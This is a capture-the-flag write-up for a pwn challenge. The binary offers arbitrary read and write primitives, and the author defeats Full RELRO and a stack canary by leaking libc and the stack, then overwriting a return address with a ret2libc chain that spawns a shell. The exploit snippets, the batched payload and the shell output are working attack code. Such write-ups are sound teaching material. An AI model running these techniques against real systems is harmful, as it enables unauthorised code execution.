# Prims Revenge — Pwn (409 pts)

> chudding out
> `nc 45.77.247.35 22020`

**Flag:** `CYBLTZ2026{bee9662e5540ba718cc648f996613261}`

The sequel to [Prims](prims.md): the **same** read/write menu, but hardened.

```
Full RELRO | Canary found | NX | No PIE | glibc 2.39
```

```c
void arbread(void)  { unsigned char* loc; read(0,&loc,8); for(i<8) printf("%02x", loc[i]); }
void arbwrite(void) { unsigned char* loc; read(0,&loc,8); read(0,loc,8); puts("arbwrite done!"); }
void menu(void)     { ... case '1': arbread(); case '2': arbwrite(); }
int  main(void)     { while(1) menu(); }
```

Same god-primitives (arbitrary 8-byte read and write, forever), but **Full RELRO** closes the
GOT-overwrite that the original Prims leaned on, and the **canary** rules out a straight stack
smash. So: leak, then overwrite a *return address* (past the canary) with a ret2libc chain.

## 1. libc, then the stack

GOT entries hold resolved libc pointers (No PIE → fixed addresses). Read one for the base, then
read libc's `environ` for a live stack pointer:

```python
base = arbread(GOT['puts']) - libc.sym.puts      # GOT['puts'] = 0x403fb8
env  = arbread(base + libc.sym.environ)          # a stack address
```

## 2. Find menu's saved return address — by scanning, not by offset

The chain has to overwrite the return slot that `main`'s `while(1) menu()` pushes every
iteration. The distance from `environ` to that slot is **not constant** — it depends on the
remote's argv/env count, so a hard-coded offset breaks across environments.

Instead, scan: `main`'s `call menu` is at `0x4013f9`, so the pushed return value is `0x4013fe`.
Walk the stack down from `environ` and take the first slot holding it:

```python
for off in range(8, 0x400, 8):
    if arbread(env - off) == 0x4013fe:
        menu_ret = env - off; break
```

## 3. Overwrite the return slot with a ret2libc chain

Four 8-byte writes lay `pop rdi ; "/bin/sh" ; ret ; system` across `menu_ret .. menu_ret+0x18`
(the slots above the return address live in `main`'s frame and aren't touched by the nested
calls, so they survive until `menu` returns):

```python
arbwrite(menu_ret + 8,  base + binsh)
arbwrite(menu_ret + 16, base + ret_gadget)   # 16-byte alignment for system/movaps
arbwrite(menu_ret + 24, base + libc.sym.system)
arbwrite(menu_ret,      base + pop_rdi)       # written last; this menu's return triggers it
```

When that `menu` returns → `pop rdi = &"/bin/sh"` → `system("/bin/sh")`. The canary at
`menu`'s own `rbp-8` is never touched, so its check passes before the `ret`.

## The remote gotcha: pipeline everything

The remote drops the connection on an input-inactivity timeout of roughly a second. Interactive
round-trips (`send`, then wait on a slow `recv`, per op) die after the first operation —
`recvrepeat(1.5)` between phases is enough to trip it. The server, however, happily processes
**many menu iterations from a single buffered send** (stdin is `setbuf(…, NULL)`, read one byte
at a time). So batch each phase into one `send` and sync with fast `recvuntil`, and send the
four writes **plus the shell command** in one final burst:

```python
payload  = b''.join(b'2\n'+p64(a)+p64(v) for a,v in writes)
payload += b'cat flag* /flag* 2>/dev/null; echo DONE\n'
io.send(payload)
```

```
uid=10001(ctf) gid=10001(ctf)
CYBLTZ2026{bee9662e5540ba718cc648f996613261}
```

Full exploit: [`tools/prims_revenge_solve.py`](../../tools/prims_revenge_solve.py)

**Takeaway:** Full RELRO + canary just redirects the write from the GOT to a return address — an
arbitrary write doesn't care which. Leak libc from the GOT, leak the stack from `environ`, and
**scan for a known return value** rather than trusting an `environ`-relative offset that shifts
with the target's environment. And when a service times out idle stdin, pipeline the whole
exploit into as few sends as possible.
